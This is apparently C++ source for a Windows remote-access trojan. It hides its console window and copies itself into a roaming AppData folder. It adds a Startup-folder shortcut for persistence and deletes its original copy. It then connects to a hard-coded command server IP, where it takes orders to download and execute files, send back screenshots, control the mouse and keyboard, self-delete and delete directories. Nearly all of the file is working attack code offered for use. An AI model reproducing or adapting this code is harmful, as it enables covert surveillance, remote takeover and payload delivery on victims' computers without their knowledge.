


#pragma warning(disable:4996)


#include <stdio.h>
#include <fstream>
#include <stdlib.h>
#include <iostream>

#include <mutex>

#include <filesystem>

#include <string>

#include <chrono>
#include <thread>

#include <vector>

#include <algorithm>
#include "screen.h"
#include "base64.h"
#include "MouseController.hpp"
#include "KeyboardController.hpp"

#include <gdiplus.h>
#pragma comment(lib, "Gdiplus.lib")

#include "tools.h"


//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

namespace fs = std::experimental::filesystem;

#if defined(_WIN32)
	#include <Windows.h>
	#include <Lmcons.h>
	#include <shlobj.h>
#endif

#include "sio/sio_client.h"








std::mutex _lock;




int main(int argc, char *argv[]) {

	MouseController MC;

	// hide console window
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	// Initialize GDI+.
	ULONG_PTR m_gdiplusToken;
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	Gdiplus::GdiplusStartup(&m_gdiplusToken, &gdiplusStartupInput, NULL);


	char user_name[UNLEN + 1];
	DWORD user_name_size = sizeof(user_name);
	GetUserName(user_name, &user_name_size);
	printf("username: %s\n", user_name);
	std::string name(user_name);

	fs::path desiredCurrentPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Media\\";
	std::string desiredCurrentString = desiredCurrentPath.string();
	fs::path startupPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
	std::string startupString = startupPath.string();
	fs::path lnkPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Startup.lnk";
	std::string lnkString = lnkPath.string();

	if (!fs::is_directory(desiredCurrentPath)) {
		printf("desired directory doesn't exist.\n%s\n", desiredCurrentString);
		fs::create_directory(desiredCurrentPath);
	}


	fs::path currentExePath = getExeFullPath();
	fs::path newExePath = desiredCurrentString + getExeName();
	std::string currentExeString = currentExePath.string();
	std::string newExeString = newExePath.string();

	printf("current exe path: %s\n", currentExeString);
	printf("new exe path: %s\n", newExeString);

	// copy to program to directory if not already in it:
	if (!(currentExeString.compare(newExeString) == 0)) {
		//fs::copy_file(currentExePath, newExePath);
		std::string copyCommand = "copy \"" + currentExeString + "\" \"" + newExeString + "\"";
		system(copyCommand.c_str());
	}

	// create the startup folder link:
	if (!fs::exists(lnkPath)) {

		printf("link doens't exist, creating...\n");

		CoInitialize(NULL);
		IShellLink* pShellLink = NULL;
		HRESULT hres;
		hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink);

		const size_t size = strlen(lnkString.c_str()) + 1;
		wchar_t* lnkWChar = new wchar_t[size];
		mbstowcs(lnkWChar, lnkString.c_str(), size);
		std::wcout << lnkWChar << std::endl;

		pShellLink->SetPath(newExeString.c_str());  // Path to the object we are referring to
		pShellLink->SetWorkingDirectory(desiredCurrentString.c_str());// desiredCurrentDirectoryChar
		pShellLink->SetDescription("Startup");
		pShellLink->SetIconLocation(newExeString.c_str(), 0);

		IPersistFile *pPersistFile;
		hres = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);

		hres = pPersistFile->Save(lnkWChar, TRUE);

		pPersistFile->Release();
		pShellLink->Release();

		delete[] lnkWChar;
	}

	

	// self delete if not in the right directory:
	if (!(currentExeString.compare(newExeString) == 0)) {
		execute(newExeString, desiredCurrentString);
		// self delete
		//selfDelete2();
		selfDelete3();
		exit(0);
	}

	// fix incase of malformed startup link
	SetCurrentDirectory(desiredCurrentString.c_str());


	sio::client myClient;
	// set infinite reconnect attempts
	myClient.set_reconnect_attempts(999999999999);

	//myClient.connect("http://fosse.co:443/socket.io");
	//myClient.connect("http://fosse.co:80/socket.io");
	//myClient.connect("http://fosse.co:80/socket.io"); // what it was
	//myClient.connect("https://fosse.co:80/socket.io"); // works // best
	//myClient.connect("https://fosse.co:80/8100/socket.io");
	//myClient.connect("http://fosse.co/8110");// works

	myClient.connect("https://104.196.121.41:80/socket.io"); // use the ip address instead of the domain name


	// emit text
	myClient.socket()->emit("registerName", name);

	myClient.socket()->on("registerNames", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		char user_name[UNLEN + 1];
		DWORD user_name_size = sizeof(user_name);
		GetUserName(user_name, &user_name_size);

		printf("username: %s\n", user_name);
		std::string name2(user_name);
		myClient.socket()->emit("registerName", name2);
	}));


	// download:
	myClient.socket()->on("dl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		printf("recieved dl.\n");

		std::string url = data->get_map()["url"]->get_string();
		//std::string filename = data->get_map()["filename"]->get_string();
		std::string filename = getFileNameFromPath(url);

		// always overwrite
		printf("downloading...\n");
		download(filename.c_str(), url.c_str());
	}));

	// execute:
	myClient.socket()->on("ex", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		printf("recieved ex.\n");
		std::string filename = data->get_map()["filename"]->get_string();

		if (fs::exists(filename)) {
			printf("file exists. running...\n");
			execute4(filename);
		}
	}));

	// screenshot:
	myClient.socket()->on("ss", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		
		printf("recieved ss.\n");

		RECT      rc;
		GetClientRect(GetDesktopWindow(), &rc);

		long width = rc.right;
		long height = rc.bottom;

		int q = data->get_map()["q"]->get_int();// quality

		// for high DPI displays:
		if (width == 1500) {
			width *= 2;
			height *= 2;
		}

		POINT a{ 0, 0 };
		POINT b{ width, height };

		std::string encoded_string = screenshotToBase64(a, b, q);

		myClient.socket()->emit("screenshot", encoded_string);
	}));


	// screenshot with new parameters:
	myClient.socket()->on("ss2", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		printf("recieved ss.\n");

		RECT      rc;
		GetClientRect(GetDesktopWindow(), &rc);

		int x1 = data->get_map()["x1"]->get_int();
		int y1 = data->get_map()["y1"]->get_int();
		int x2 = data->get_map()["x2"]->get_int();
		int y2 = data->get_map()["y2"]->get_int();
		int q = data->get_map()["q"]->get_int();

		long width = rc.right;
		long height = rc.bottom;

		POINT a;
		POINT b;
		
		// incase I want to set the compression level but don't know the width and height:
		if (x1 == -1) {
			width = rc.right;
			height = rc.bottom;

			// for high DPI displays:
			if (width == 1500) {
				width *= 2;
				height *= 2;
			}

			a = { 0, 0 };
			b = { width, height };
		} else {
			a = { x1, y1 };
			b = { x2, y2 };
		}

		std::string encoded_string = screenshotToBase64(a, b, q);

		myClient.socket()->emit("screenshot", encoded_string);
	}));

	// mouse action:
	myClient.socket()->on("mac", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		printf("recieved mac.\n");

		int x = data->get_map()["x"]->get_int();
		int y = data->get_map()["y"]->get_int();

		int which = data->get_map()["which"]->get_int();

		RECT      rc;
		GetClientRect(GetDesktopWindow(), &rc);
		long width = rc.right;
		long height = rc.bottom;
		if (width == 1500) {
			x /= 2;
			y /= 2;
		}

		// action 0: move mouse		- no delay
		// action 1: left click		- has delay
		// action 2: right click	- has delay
		// action 3: left down		- has delay
		// action 4: right down		- has delay
		// action 5: left up		- has delay
		// action 6: right up		- has delay

		MC.moveAbs(x, y);
		if (which > 0) {
			Sleep(100);
		}

		switch (which) {
		case 0:
			// already moved the mouse
			break;
		case 1:
			MC.leftClick();
			break;
		case 2:
			MC.rightClick();
			break;
		case 3:
			MC.leftDown();
			break;
		case 4:
			MC.rightDown();
			break;
		case 5:
			MC.leftUp();
			break;
		case 6:
			MC.rightUp();
			break;
		}
		
	}));


	// send keystrokes
	myClient.socket()->on("txt", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {

		printf("recieved txt.\n");

		std::string keys = data->get_map()["text"]->get_string();

		if (keys == "Enter") {
			sendEnter();
		} else if (keys == "Backspace") {
			sendBackspace();
		} else if (keys == "Tab") {
			sendTab();
		} else if (keys == "ArrowUp") {
			sendUpArrow();
		} else if (keys == "ArrowDown") {
			sendDownArrow();
		} else if (keys == "ArrowLeft") {
			sendLeftArrow();
		} else if (keys == "ArrowRight") {
			sendRightArrow();
		} else if (keys == "Shift") {
			sendShift();
		} else if (keys == "CapsLock") {
			sendCaps();
		} else if (keys == "Control") {
			sendControl();
		} else if (keys == "Alt") {
			sendAlt();
		} else if (keys == "Delete") {
			sendDelete();
		} else if (keys == "Insert") {
			sendInsert();
		} else if (keys == "Meta") {
			sendWindows();
		} else if (keys == "Escape") {
			sendEscape();
		} else {
			TCHAR *param = new TCHAR[keys.size() + 1];
			param[keys.size()] = 0;
			//As much as we'd love to, we can't use memcpy() because
			//sizeof(TCHAR)==sizeof(char) may not be true:
			std::copy(keys.begin(), keys.end(), param);
			sendKeystrokes(param);
		}

	}));
	


	myClient.socket()->on("sd", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		//selfDelete2();
		selfDelete3();
		exit(0);
	}));


	myClient.socket()->on("dd", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
		deleteDir();
	}));


	// Shut Down GDI+
	//Gdiplus::GdiplusShutdown(m_gdiplusToken);

	

	// why is this necessary??
	int x;
	std::cin >> x;

	return 0;
}